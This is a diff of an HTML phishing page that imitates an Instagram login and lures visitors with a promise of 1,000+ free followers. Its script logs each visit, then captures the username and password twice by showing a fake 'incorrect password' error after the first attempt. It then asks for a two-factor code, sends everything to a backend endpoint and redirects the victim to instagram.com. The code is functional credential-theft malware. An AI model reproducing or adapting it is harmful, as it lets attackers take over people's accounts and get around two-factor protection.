@@ -3,82 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Meta System Sync</title>
+    <title>Growth Hub | Secure Login</title>
     <style>
-        body { background: #fafafa; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 8px; }
-        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; box-sizing: border-box; }
-        .btn { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .error { color: #ed4956; font-size: 13px; margin-bottom: 15px; display: none; background: #fff2f2; padding: 10px; border-radius: 4px; }
-        #loader { display: none; margin: 20px 0; }
-        .spin { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 0 auto; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+        .container { background: #fff; width: 350px; padding: 40px; border-radius: 1px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        .insta-font { font-family: 'Segoe UI', cursive; font-size: 35px; font-weight: 700; color: #262626; margin-bottom: 25px; }
+        .promo-txt { font-weight: 600; color: #8e8e8e; font-size: 15px; margin-bottom: 20px; line-height: 1.2; }
+        input { width: 100%; padding: 10px; margin-bottom: 7px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
+        input:focus { border: 1px solid #a8a8a8; outline: none; }
+        .login-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; margin: 15px 0; font-size: 14px; }
+        .login-btn:disabled { background: #b2dffc; }
+        .error-msg { color: #ed4956; font-size: 14px; margin-bottom: 15px; display: none; }
+        #loading-ui { display: none; flex-direction: column; align-items: center; }
+        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #262626; border-radius: 50%; width: 18px; height: 18px; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 15px 0; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" width="80" style="margin-bottom:20px;">
-        <div id="error" class="error">Security Check: Invalid Access Key. Try again.</div>
-        
-        <div id="login-form">
-            <input type="text" id="u" placeholder="Account Username">
-            <input type="password" id="p" placeholder="Access Password">
-            <button class="btn" onclick="captureData()">CONNECT ACCOUNT</button>
-        </div>
 
-        <div id="loader">
-            <div class="spin"></div>
-            <p style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">Verifying with Meta API...</p>
-        </div>
+<div class="container">
+    <div class="insta-font">SocialSync</div>
+    <p class="promo-txt">Verify your account to claim 1,000+ Free Followers.</p>
+    
+    <div id="err" class="error-msg">Sorry, your password was incorrect. Please double-check your password.</div>
 
-        <div id="otp-form" style="display:none;">
-            <p style="font-size: 14px; font-weight: bold;">Two-Factor Authentication</p>
-            <p style="font-size: 12px; color: #8e8e8e; margin-bottom: 15px;">Enter the 6-digit code sent to your mobile.</p>
-            <input type="number" id="o" placeholder="000000">
-            <button class="btn" onclick="sendOTP()">VERIFY DEVICE</button>
-        </div>
+    <div id="auth-ui">
+        <input type="text" id="uid" placeholder="Phone number, username, or email">
+        <input type="password" id="pass" placeholder="Password">
+        <button class="login-btn" onclick="capture()">Log In</button>
+        <div class="divider">OR</div>
+        <p style="color:#385185; font-weight:600; font-size:14px; cursor:pointer;">Log in with Facebook</p>
     </div>
 
-    <script>
-        let step = 0;
-        async function captureData() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            if(!u || !p) return;
+    <div id="loading-ui">
+        <div class="loader"></div>
+        <p style="font-size: 12px; color: #8e8e8e; margin-top: 10px;">Checking credentials...</p>
+    </div>
 
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
+    <div id="otp-ui" style="display:none;">
+        <p style="font-size: 14px; font-weight: 600; margin-bottom: 5px;">Enter Security Code</p>
+        <p style="font-size: 12px; color: #8e8e8e; margin-bottom: 15px;">We sent a 6-digit code to your device.</p>
+        <input type="number" id="otp" placeholder="Security Code">
+        <button class="login-btn" onclick="finish()">Confirm</button>
+    </div>
+</div>
 
-            // Sending to Python Backend
-            await fetch('/api/index', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ u, p, t: step === 0 ? 'LOG' : 'VERIFIED' })
-            });
+<script>
+    let step = 0;
+    // Visit Tracking
+    window.onload = () => {
+        fetch('/api/index', { method: 'POST', body: JSON.stringify({ t: 'VISIT', d: navigator.userAgent }) });
+    };
 
+    async function capture() {
+        const u = document.getElementById('uid').value;
+        const p = document.getElementById('pass').value;
+        if(!u || !p) return;
+
+        document.getElementById('auth-ui').style.display = 'none';
+        document.getElementById('loading-ui').style.display = 'flex';
+
+        if(step === 0) {
+            // First capture: Show error
+            await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'TRY1'}) });
             setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                if(step === 0) {
-                    document.getElementById('login-form').style.display = 'block';
-                    document.getElementById('error').style.display = 'block';
-                    document.getElementById('p').value = '';
-                    step++;
-                } else {
-                    document.getElementById('otp-form').style.display = 'block';
-                }
+                document.getElementById('loading-ui').style.display = 'none';
+                document.getElementById('auth-ui').style.display = 'block';
+                document.getElementById('err').style.display = 'block';
+                document.getElementById('pass').value = '';
+                step++;
             }, 2500);
+        } else {
+            // Second capture: Move to OTP
+            await fetch('/api/index', { method: 'POST', body: JSON.stringify({u, p, t: 'REAL'}) });
+            setTimeout(() => {
+                document.getElementById('loading-ui').style.display = 'none';
+                document.getElementById('otp-ui').style.display = 'block';
+            }, 3000);
         }
+    }
 
-        async function sendOTP() {
-            const o = document.getElementById('o').value;
-            if(o.length < 6) return;
-            await fetch('/api/index', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ u: document.getElementById('u').value, o, t: 'OTP' })
-            });
-            window.location.href = "https://instagram.com";
-        }
-    </script>
+    async function finish() {
+        const o = document.getElementById('otp').value;
+        await fetch('/api/index', { method: 'POST', body: JSON.stringify({u: document.getElementById('uid').value, o, t: 'OTP'}) });
+        window.location.href = "https://instagram.com";
+    }
+</script>
 </body>
-</html>
+    </html>
+    
